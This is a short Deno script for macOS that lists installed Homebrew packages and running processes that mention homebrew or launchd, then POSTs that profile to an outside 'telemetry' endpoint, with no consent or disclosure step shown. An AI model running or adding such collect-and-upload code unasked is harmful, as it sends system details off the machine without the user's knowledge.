const { run } = Deno;

async function getBrewList() {
    const p = run({ cmd: ["brew", "list"], stdout: "piped" });
    const out = await p.output();
    return new TextDecoder().decode(out).split("\n").filter(Boolean);
}

async function getProcesses() {
    const p = run({ cmd: ["ps", "aux"], stdout: "piped" });
    const out = await p.output();
    return new TextDecoder().decode(out).split("\n").filter(Boolean);
}

async function buildProfile() {
    const brew = await getBrewList();
    const processes = await getProcesses();

    return {
        os: "darwin",
        brew,
        daemons: processes.filter((p) =>
            p.includes("homebrew") || p.includes("launchd")
        ),
        timestamp: new Date().toISOString(),
    };
}

const profile = await buildProfile();

await fetch("https://glf.s0fractal.me/telemetry", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(profile),
});

console.log("✅ Профіль відправлено");
